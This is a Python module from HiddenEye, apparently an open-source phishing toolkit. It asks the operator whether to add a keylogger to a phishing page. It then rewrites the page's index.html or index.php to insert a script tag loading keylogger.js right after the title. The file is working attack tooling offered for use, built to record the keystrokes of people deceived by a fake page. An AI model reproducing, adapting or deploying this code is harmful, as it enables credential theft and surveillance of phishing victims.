#
#    HiddenEye  Copyright (C) 2020  DarkSec https://dark-sec-official.com
#    This program comes with ABSOLUTELY NO WARRANTY; for details read LICENSE.
#    This is free software, and you are welcome to redistribute it
#    under certain conditions; you can read LICENSE for details.
#


from Defs.ImportManager.unsorted_will_be_replaced import wait, run_command, path
import Defs.ThemeManager.theme as theme

default_palette = theme.default_palette


def add_keylogger_prompt():
    run_command('clear')
    print('''{1}
        _  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {1}http://github.com/darksecdevelopers
        {0}** BY: {1}DARKSEC {0}**'''.format(default_palette[0], default_palette[2]))
    print("-------------------------------\n{0}[ KEYLOGGER PROMPT ]{1}!! {0}\n-------------------------------".format(default_palette[0], default_palette[4]))
    print("\n{0}[{1}!{0}]{1}ATTENTION: Adding Keylogger Mostly Kills the Tunnel Connection.\n".format(default_palette[0], default_palette[4]))
    print("\n{0}[{1}*{0}]{0}DO YOU WANT TO ADD A KEYLOGGER IN PHISHING PAGE-{1}(Y/N)".format(default_palette[0], default_palette[4]))
    choice = input("\n\n{1}{0}YOUR CHOICE >>> {2}".format(default_palette[0], default_palette[4], default_palette[2])).upper()
    if choice == 'Y':
        add_keylogger()
    else:
        wait(1)


def add_keylogger():
    if path.exists('Server/www/index.html'):
        with open('Server/www/index.html') as f:
            read_data = f.read()
        c = read_data.replace(
            '</title>', '</title><script src="keylogger.js"></script>')
        f = open('Server/www/index.html', 'w')
        f.write(c)
        f.close()
        print("\n{0}[{1}#{0}]Keylogger{0} ADDED !!!".format(default_palette[0], default_palette[4]))
        wait(2)
    else:
        with open('Server/www/index.php') as f:
            read_data = f.read()
        c = read_data.replace(
            '</title>', '</title><script src="keylogger.js"></script>')
        f = open('Server/www/index.php', 'w')
        f.write(c)
        f.close()
        print("\n{0}[{1}#{0}]Keylogger{0} ADDED !!!".format(default_palette[0], default_palette[4]))
        wait(2)

